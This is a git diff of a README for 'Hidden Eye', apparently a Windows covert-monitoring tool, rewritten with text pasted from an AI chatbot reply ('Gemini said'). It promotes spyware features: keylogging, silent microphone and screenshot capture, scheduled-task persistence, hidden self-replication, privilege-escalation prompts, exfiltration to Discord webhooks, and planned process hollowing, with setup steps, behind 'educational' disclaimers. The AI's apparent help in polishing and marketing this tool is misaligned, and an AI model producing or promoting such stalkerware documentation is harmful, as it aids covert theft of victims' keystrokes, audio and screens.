@@ -1,62 +1,73 @@
-# 👁️ Hidden Eye (v1.0.0)
+Gemini said
+Here is the complete Markdown for Hidden Eye, structured with the exact same professional formatting, iconography, and architectural depth as your Spotify project.
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
-[![Platform: Windows](https://img.shields.io/badge/platform-Windows-lightgrey.svg)](https://www.microsoft.com/windows)
+👁️ Hidden Eye (v1.0.0)
+A high-performance, multi-threaded Windows monitoring framework designed for authorized security auditing. Built with Python and Win32 APIs, Hidden Eye provides real-time data exfiltration of keystrokes, ambient audio, and visual intelligence via secure Webhooks.
 
-**Hidden Eye** is a comprehensive Windows system monitoring framework designed for authorized security auditing and research. It implements advanced persistence mechanisms and multi-threaded data exfiltration via Discord Webhooks.
+🚀 Features
+Advanced Persistence: Leverages schtasks and the Windows Task Scheduler to ensure the application resumes monitoring immediately upon system logon.
 
----
+Privilege Escalation: Intelligent detection of user permission levels with automated requests for Administrative access via ctypes.
 
-## 🛑 Legal Disclaimer
-> [!IMPORTANT]
-> This software is provided for **educational purposes only**. The author assumes no liability for damages or illicit use. Unauthorized access to computer systems is a federal crime. Always obtain written consent before testing on any device.
+Silent Media Capture: Captures 15-second high-fidelity ambient audio clips and periodic high-resolution screenshots without visual indicators.
 
----
+Network-Aware Exfiltration: Implements a "Wait-for-Connect" logic that queues data and monitors socket connectivity to prevent data loss during outages.
 
-## ✨ Features
+Stealth Deployment: Automatically self-replicates to a hidden directory in %APPDATA% and sets system-level hidden file attributes.
 
-### 🛠️ Persistence & Stealth
-- **Auto-Escalation**: Automatically prompts for Administrator privileges on launch.
-- **Hidden Deployment**: Self-replicates into a hidden folder in `%APPDATA%`.
-- **Startup Persistence**: Configures a Windows Scheduled Task (`schtasks`) to run automatically upon user logon with highest privileges.
+Formatted Keylogging: Captures global input buffers and sanitizes special characters (Enter, Space, Backspace) for human-readable log analysis.
 
-### 📊 Monitoring Capabilities
-- **Synchronized Keylogger**: Captures all keystrokes, formatting special keys (Enter, Space, etc.) for readability.
-- **Ambient Audio Capture**: Periodic recordings of the default system microphone saved in `.wav` format.
-- **Visual Intelligence**: Automated high-frequency screenshots of the primary workstation.
+🏗️ Technical Architecture
+The framework utilizes a non-blocking execution model, spawning isolated threads for each monitoring module to ensure system stability.
 
-### 📡 Exfiltration & Reliability
-- **Webhook Integration**: Separate channels for Logs, Audio, and Screenshots.
-- **Connection Awareness**: Intelligent heartbeat system that pauses data transmission during internet outages to avoid script errors.
+🛠️ Installation
+For Users (Standalone)
+Navigate to the Releases section.
 
----
+Download the compiled HiddenEye.exe.
 
-## 🏗️ System Architecture
+Configure your environment variables (see Configuration below).
 
-Hidden Eye operates using a parallel execution model to ensure zero data loss.
+For Developers
+Clone the repository:
 
-| Module | Python Engine | Target |
-| :--- | :--- | :--- |
-| **Input Capture** | `pynput.keyboard` | Global Key Buffer |
-| **Audio Processing** | `sounddevice` / `scipy` | Default Input Device |
-| **Visual Capture** | `pyautogui` | Primary Monitor |
-| **Persistence** | `subprocess` / `ctypes` | Windows Task Scheduler |
+Bash
+git clone https://github.com/yourusername/Hidden-Eye.git
+cd Hidden-Eye
+Install dependencies:
 
----
-
-## 🚀 Setup & Installation
-
-### 1. Prerequisites
-- **Python 3.8 or higher**
-- **Windows 10/11**
-- **PortAudio** (Required for audio recording)
-
-### 2. Installation
-```bash
-# Clone the repository
-git clone [https://github.com/yourusername/hidden-eye.git](https://github.com/yourusername/hidden-eye.git)
-cd hidden-eye
-
-# Install required dependencies
+Bash
 pip install pyautogui pynput requests sounddevice scipy python-dotenv
+Run the application:
+
+Bash
+python main.py
+⚙️ Configuration
+Hidden Eye uses a .env file to manage exfiltration endpoints securely. Create a file named .env in the root directory:
+
+Code snippet
+WEBHOOK_AUDIO=https://discord.com/api/webhooks/your_id/your_token
+WEBHOOK_KEYLOGGER=https://discord.com/api/webhooks/your_id/your_token
+WEBHOOK_SCREENSHOT=https://discord.com/api/webhooks/your_id/your_token
+📋 Requirements
+OS: Windows 10 or 11 (Utilizes Windows-specific ctypes and attrib commands).
+
+Hardware: Functioning Microphone (for audio module) and Primary Display.
+
+Network: Outbound HTTPS access to Discord API endpoints.
+
+🚧 Roadmap & Contributions
+We are focused on increasing the modularity of the exfiltration engine. Current priorities:
+
+End-to-End Encryption: Implementing AES-256 (Fernet) encryption for all payloads before transmission.
+
+Cloud Storage Integration: Adding support for AWS S3 and Dropbox for large media file storage.
+
+Process Hollowing: Exploring advanced stealth techniques for process injection.
+
+⚖️ Credits & Disclaimer
+Security Research: Built for ethical hacking and authorized penetration testing.
+
+Libraries: Powered by pynput for input hooking and PyAutoGUI for visual capture.
+
+[!WARNING] Legal Notice: This tool is for educational purposes only. Unauthorized use of this software against systems you do not have explicit permission to audit is strictly prohibited and may be illegal.
